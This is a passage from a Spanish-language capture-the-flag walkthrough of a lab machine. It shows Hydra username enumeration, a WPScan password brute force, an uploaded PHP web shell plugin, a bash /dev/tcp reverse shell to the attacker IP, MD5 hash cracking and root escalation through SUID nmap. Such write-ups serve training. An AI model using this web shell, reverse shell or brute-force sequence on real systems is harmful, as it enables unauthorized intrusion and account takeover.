</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Finished: Tue Aug 13 02:06:24 2024
</span></span></span><span class=line><span class=cl><span class=go>[+] Requests Done: 104918
</span></span></span><span class=line><span class=cl><span class=go>[+] Cached Requests: 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Sent: 27.47 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Received: 33.071 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Memory used: 434.199 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Elapsed time: 00:30:06
</span></span></span></code></pre></div><p>de donde veo algunos plugins que nos podr√≠an ser √∫tiles si es que est√°n desactualizados y presentan vulnerabilidades.</p><ul><li>Recuerdo tambi√©n que versiones de <code>WordPress</code> m√°s antiguas muestran el mensaje <code>Invalid username</code> cuando proveemos un usuario que no existe en el directorio <code>/wp-login</code>. Pero si el usuario existe, incluso si la contrase√±a de √©ste no es correcta, el mensaje que se muestra es otro. Por ejemplo, si probamos con un usuario que sabemos que no existe tendremos en <code>http://10.20.1.120/wp-login</code>:</li></ul><p><img alt="MrRobot 4" src=/images/MrRobot_4.png></p><ul><li>Mientras que, como se dijo, si un usuario existe, pero la contrase√±a prove√≠da no es correcta, usualmente no obtenemos este mensaje. Podemos jugar con esta respuesta de la p√°gina web usando <code>Hydra</code> tratando de encontrar usuario por &ldquo;fuerza bruta&rdquo; s√≥lo bas√°ndonos en el texto <code>Invalid username</code> y el diccionario hallado previamente gracias a <code>robots.txt</code>. Noto que hay algunas l√≠neas duplicadas en el archivo <code>fsocity.dic</code>, de manera que guardamos todas aquellas l√≠neas que no est√©n repetidas/sean √∫nicas en un nuevo archivo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sort -u fsocity.dic &gt; sorted_fsocity.dic
</span></span></span></code></pre></div><ul><li>Realizar este peque√±o paso, sobre todo si se trabaja con fuerza bruta, nos ahorrar√° un mont√≥n de tiempo. Esto dado que pasamos de casi 800 000 l√≠neas a tan s√≥lo 11 000:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat sorted_fsocity.dic | wc -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>11451
</span></span></span></code></pre></div><ul><li>Para ver cu√°l es la petici√≥n que se env√≠a al servidor cuando hacemos una petici√≥n de logueo por <code>/wp-login.php</code> es que intercepto la petici√≥n usando <code>Burpsuite</code>. Intercepto la petici√≥n enviada luego de probar con el usuario <code>user</code> y la contrase√±a <code>password</code>. Realizando esto tenemos:</li></ul><p><img alt="MrRobot 3" src=/images/MrRobot_3.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-login.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.20.1.120</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>102</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.20.1.120</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.20.1.120/wp-login.php</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>wordpress_test_cookie=WP+Cookie+check</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>log=user&amp;pwd=password&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.20.1.120%2Fwp-admin%2F&amp;testcookie=1
</span></span></code></pre></div><p>donde la parte importante es la data de la petici√≥n <code>POST</code> que se encuentra en la parte inferior del texto anterior. Tambi√©n me doy cuenta que si s√≥lo env√≠o como datos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>log=&lt;user&gt;&amp;pwd=&lt;password&gt;
</span></span></code></pre></div><p>la petici√≥n <code>HTTP</code> interceptada tambi√©n funciona.</p><ul><li>Ahora usaremos <code>Hydra</code>. Queremos realizar peticiones <code>HTTP</code> hasta que la respuesta del servidor <em>NO</em> contenga el string <code>Invalid username</code>. Podemos hacer esto corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hydra -L sorted_fsocity.dic -p testrandompassword 10.20.1.120 http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username&#34;  -V -F
</span></span></span></code></pre></div><p>donde:</p><ol><li><code>-L</code> es un archivo conteniendo los potenciales usuarios. En este caso es el archivo <code>fsocity.dic</code> que no contiene l√≠neas repetidas.</li><li><code>-p</code> es una contrase√±a random con la que intentamos loguearnos al panel de login de <code>WordPress</code>.</li><li><code>http-post-form</code> es el m√©todo a usar por <code>Hydra</code> para performar el ataque de fuerza bruta.</li><li><code>"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</code> es la data por m√©todo <code>POST</code> a mandar al servidor. Primero especificamos la ruta <code>/wp.login.php</code>. Luego de los primeros dos puntos <code>:</code>, especificamos la data a enviar por m√©todo <code>POST</code>; la variable<code>^USER^</code> ser√° reemplazada por los valores que se encuentran en cada l√≠nea del archivo pasado con la flag <code>-L</code>, mientras que <code>^PASS^</code> ser√° reemplazado con el valor prove√≠do a trav√©s de la flag <code>-p</code>. Luego de los segundos dos puntos <code>:</code> ponemos el texto que <em>NO</em> queremos que est√© presente en la respuesta del servidor.</li><li><code>-V</code> es para activar la opci√≥n de verbose y as√≠ ver las peticiones enviadas.</li><li><code>-F</code> da la opci√≥n de que cuando <code>Hydra</code> tenga un c√≥digo exitoso entonces pare las iteraciones y detenga el programa.</li></ol><ul><li>Luego de un tiempo de correr esto encontramos algo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hydra -L sorted_fsocity.dic -p testrandompassword 10.20.1.120 http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username&#34; -V -F
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[ATTEMPT] target 10.20.1.120 - login &#34;emails&#34; - pass &#34;testrandompassword&#34; - 5487 of 11452 [child 15] (0/0)
</span></span></span><span class=line><span class=cl><span class=go>[ATTEMPT] target 10.20.1.120 - login &#34;embed&#34; - pass &#34;testrandompassword&#34; - 5488 of 11452 [child 7] (0/0)
</span></span></span><span class=line><span class=cl><span class=go>[80][http-post-form] host: 10.20.1.120   login: elliot   password: testrandompassword
</span></span></span><span class=line><span class=cl><span class=go>[STATUS] attack finished for 10.20.1.120 (valid pair found)
</span></span></span><span class=line><span class=cl><span class=go>1 of 1 target successfully completed, 1 valid password found
</span></span></span><span class=line><span class=cl><span class=go>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-13 03:21:00
</span></span></span></code></pre></div><p>de donde tenemos un usuario: <code>elliot</code></p><ul><li>Tal cual se mencion√≥ anteriormente, si ponemos el usuario <code>elliot</code> y una contrase√±a cualquiera en <code>/wp-login.php</code> el mensaje de error es diferente:</li></ul><p><img alt="MrRobot 5" src=/images/MrRobot_5.png></p><ul><li>Ahora, puedo usar este usuario para intentar un <code>Brute Force Password Login</code> (intentar loguearnos por fuerza bruta). Para esto utilizar√© de nuevo la herramienta <code>WPScan</code> y el diccionario con las palabras no repetidas como intento de contrase√±a:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wpscan --password-attack xmlrpc -t 20 -U elliot -P sorted_fsocity.dic --url http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[+] Performing password attack on Xmlrpc against 1 user/s
</span></span></span><span class=line><span class=cl><span class=go>[SUCCESS] - elliot / ER28-0652
</span></span></span><span class=line><span class=cl><span class=go>Trying elliot / escape Time: 00:01:58 &lt;==============================                                                                &gt; (5640 / 17091) 32.99%  ETA: ??:??:??
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] Valid Combinations Found:
</span></span></span><span class=line><span class=cl><span class=go> | Username: elliot, Password: ER28-0652
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span></span><span class=line><span class=cl><span class=go>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Finished: Tue Aug 13 03:25:40 2024
</span></span></span><span class=line><span class=cl><span class=go>[+] Requests Done: 5813
</span></span></span><span class=line><span class=cl><span class=go>[+] Cached Requests: 6
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Sent: 2.883 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Received: 3.8 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Memory used: 311.969 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Elapsed time: 00:02:09
</span></span></span></code></pre></div><p>donde encontramos credenciales v√°lidas: <code>elliot:ER28-0652</code></p><ul><li>Usando estas credenciales en el directorio <code>/wp-login</code> funciona y podemos acceder al panel de <code>WordPress</code>:</li></ul><p><img alt="Mr Robot" src=/images/MrRobot_6.png></p><ul><li>Ahora el plan es tratar de inyectar c√≥digo malicioso en archivos editables que podamos tener o ver si podemos instalar/crear archivos. Para esto podemos clickear en la opci√≥n <code>Plugins</code> al lado izquierdo y luego en <code>Add New</code>. Si realizamos esto deber√≠amos ver algo como lo siguiente:</li></ul><p><img alt="MrRobot 7" src=/images/MrRobot_7.png></p><ul><li>Ahora decido crear un plugin <code>PHP</code> &ldquo;malicioso&rdquo; en un archivo que llamar√© <code>CMD.php</code> con el siguiente c√≥digo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl> <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> Plugin Name: CMD Plugin
</span></span></span><span class=line><span class=cl><span class=cm> Version: 1.0.0
</span></span></span><span class=line><span class=cl><span class=cm> Author: gunzf0x
</span></span></span><span class=line><span class=cl><span class=cm> Author URI: wordpress.org
</span></span></span><span class=line><span class=cl><span class=cm> License: GPL2
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;CMD&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>y lo comprimo en un archivo <code>.zip</code> el cual llamar√© <code>webshell.zip</code> corriendo en mi m√°quina:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ zip webshell.zip CMD.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  adding: CMD.php (deflated 8%)
</span></span></span></code></pre></div><ul><li>De vuelta al portal de <code>WordPress</code>, clickeo en el bot√≥n <code>Upload Plugin</code> en la parte superior del sitio web y selecciono mi archivo <code>.zip</code> malicioso. Ahora deber√≠amos ver algo como lo siguiente:</li></ul><p><img alt="MrRobot 8" src=/images/MrRobot_8.png></p><p>y clickeamos en <code>Install Now</code>.</p><ul><li>Si esto funcion√≥ ahora deber√≠amos ver:</li></ul><p><img alt="MrRobot 9" src=/images/MrRobot_9.png></p><p>donde dice que nuestro plugin ha sido instalado exitosamente.</p><ul><li>Dado que mi plugin se llama <code>webshell</code> con un archivo <code>CMD.php</code> dentro de √©ste, √©ste deber√≠a de estar localizado en la ruta <code>/wp-content/plugins/webshell</code> por defecto de <code>WordPress</code> (donde se almacenan los plugins). Si chequeo con <code>cURL</code> si este archivo existe:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -I http://10.20.1.120/wp-content/plugins/webshell/CMD.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Date: Tue, 13 Aug 2024 03:52:15 GMT
</span></span></span><span class=line><span class=cl><span class=go>Server: Apache
</span></span></span><span class=line><span class=cl><span class=go>X-Powered-By: PHP/5.5.29
</span></span></span><span class=line><span class=cl><span class=go>X-Frame-Options: SAMEORIGIN
</span></span></span><span class=line><span class=cl><span class=go>Cache-Control: max-age=0, no-cache
</span></span></span><span class=line><span class=cl><span class=go>Content-Type: text/html; charset=UTF-8
</span></span></span></code></pre></div><p>vemos que nuestro plugin malicioso est√° all√≠.</p><ul><li>Chequeamos si podemos correr c√≥digo remotamente usando <code>cURL</code> tambi√©n. Por ejemplo, si queremos correr el comando <code>id</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.120/wp-content/plugins/webshell/CMD.php&#39; --data-urlencode &#39;CMD=id&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>uid=1(daemon) gid=1(daemon) groups=1(daemon)
</span></span></span></code></pre></div><ul><li>Me preparo para entablar una reverse shell poni√©ndome en escucha con <code>netcat</code> por el puerto <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>y me env√≠o una reverse shell usando <code>cURL</code> a trav√©s del plugin malicioso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.120/wp-content/plugins/webshell/CMD.php&#39; --data-urlencode &#39;CMD=bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.20.1.115/443 0&gt;&amp;1&#34;&#39;
</span></span></span></code></pre></div><p>donde <code>10.20.1.115</code> es mi IP de atacante y <code>443</code> es el puerto en el cual ya me encuentro en escucha con <code>netcat</code>.</p><ul><li>As√≠ es como obtenemos una shell como el usuario <code>daemon</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.115] from (UNKNOWN) [10.20.1.120] 58162
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1715): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/webshell$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>daemon
</span></span></span></code></pre></div><ul><li>Noto que hay un usuario llamado <code>robot</code> en la m√°quina:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls -la /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root root 4096 Nov 13  2015 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
</span></span></span></code></pre></div><p>y dentro de su directorio <code>home</code> puedo ver un archivo que se ve prometedor:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls -la /home/robot
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 16
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
</span></span></span><span class=line><span class=cl><span class=go>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</span></span></span></code></pre></div><p>llamado <code>password.raw-md5</code>.</p><ul><li>Leyendo este archivo nos muestra un hash:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /home/robot/password.raw-md5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot:c3fcd3d76192e4007dfb496cca67e13b
</span></span></span></code></pre></div><ul><li>Guardo este hash y nombre de usuario en un archivo llamado <code>robot_hash</code> (simplemente copio el contenido del archivo encontrado y lo guardo en mi m√°quina de atacante en otro archivo) e intento performar un <code>Brute Force Password Cracking</code> (crackear contrase√±as por fuerza bruta) con <code>JohnTheRipper</code> (<code>john</code>). Uso, adem√°s, la herramienta <code>hash-identifier</code> para identificar el tipo de hash; el cual nos muestra que es un hash de tipo <code>MD5</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hash-identifier
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>   #     __  __                     __           ______    _____           #
</span></span></span><span class=line><span class=cl><span class=go>   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
</span></span></span><span class=line><span class=cl><span class=go>   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
</span></span></span><span class=line><span class=cl><span class=go>   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
</span></span></span><span class=line><span class=cl><span class=go>   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
</span></span></span><span class=line><span class=cl><span class=go>   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
</span></span></span><span class=line><span class=cl><span class=go>   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                             By Zion3R #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                    www.Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                   Root@Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> HASH: c3fcd3d76192e4007dfb496cca67e13b
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Possible Hashs:
</span></span></span><span class=line><span class=cl><span class=go>[+] MD5
</span></span></span><span class=line><span class=cl><span class=go>[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Por usamos el formato <code>Raw-MD5</code> para <code>john</code>. Es as√≠ como intentamos crackear la contrase√±a usando el diccionario <code>rockyou.txt</code> (descargable desde <a href=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt class=external-link target=_blank rel=noopener>este link</a>):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
</span></span></span><span class=line><span class=cl><span class=go>Warning: no OpenMP support for this hash type, consider --fork=5
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>abcdefghijklmnopqrstuvwxyz (?)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:00 DONE (2024-08-13 04:20) 50.00g/s 2035Kp/s 2035Kc/s 2035KC/s bonjour1..teletubbies
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show --format=Raw-MD5&#34; options to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>Es as√≠ como encontramos nuevas credenciales: <code>robot:abcdefghijklmnopqrstuvwxyz</code></p><ul><li>Dado que no tenemos ning√∫n servicio para acceder a la m√°quina v√≠ctima (como <code>SSH</code>), es que decido pivotear internamente al usuario <code>robot</code> utilizando la contrase√±a crackeada:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su robot
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot@linux:/opt/bitnami/apps/wordpress/htdocs$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot
</span></span></span></code></pre></div><p>Donde podemos leer la segunda flag de usuario en el directorio <code>/home/robot</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ cat /home/robot/key-2-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>822c73956184f694993bede3eb39f959
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Finalmente, buscando por archivos <code>SUID</code> cuyo propietario sea <code>root</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ find / -perm -4000 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/bin/ping
</span></span></span><span class=line><span class=cl><span class=go>/bin/umount
</span></span></span><span class=line><span class=cl><span class=go>/bin/mount
</span></span></span><span class=line><span class=cl><span class=go>/bin/ping6
</span></span></span><span class=line><span class=cl><span class=go>/bin/su
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/passwd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/newgrp
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chsh
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chfn
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/gpasswd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/sudo
</span></span></span><span class=line><span class=cl><span class=go>/usr/local/bin/nmap
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/openssh/ssh-keysign
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/eject/dmcrypt-get-device
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/pt_chown
</span></span></span></code></pre></div><p>tenemos que <code>/usr/local/bin/nmap</code> es uno que no es muy com√∫n.</p><ul><li>Basados en <code>GTFOBins</code> para <a href=https://gtfobins.github.io/gtfobins/nmap/ class=external-link target=_blank rel=noopener>Nmap</a>, las versiones de <code>Nmap</code> que tienen la opci√≥n <code>--interactive</code> son desde la <code>2.02</code> a la <code>5.21</code>. Si revisamos qu√© versi√≥n de <code>Nmap</code> es la que tiene instalada la m√°quina v√≠ctima tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ /usr/local/bin/nmap -V
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nmap version 3.81 ( http://www.insecure.org/nmap/ )
</span></span></span></code></pre></div><p>La versi√≥n es <code>3.81</code>, por lo que deber√≠amos de tener esta opci√≥n interactiva con <code>Nmap</code>.</p><ul><li>Es as√≠ como podemos usar <code>Nmap</code> en modo interactivo e invocar una shell tal cual se indica en <code>GTFOBins</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ nmap --interactive
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Interactive Mode -- press h &lt;enter&gt; for help
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nmap&gt; !/bin/sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> whoami
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>Donde hemos corrido el ocmando <code>!/bin/sh</code> dentro de la opci√≥n interactiva de <code>Nmap</code> para spawnear una shell. ¬°Y eso es todo!</p><ul><li>Podemos leer la √∫ltima key/flag:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> cat /root/key-3-of-3.txt
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>04787ddef27c3dee1ee161b21670b4e4
</span></span></span></code></pre></div><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>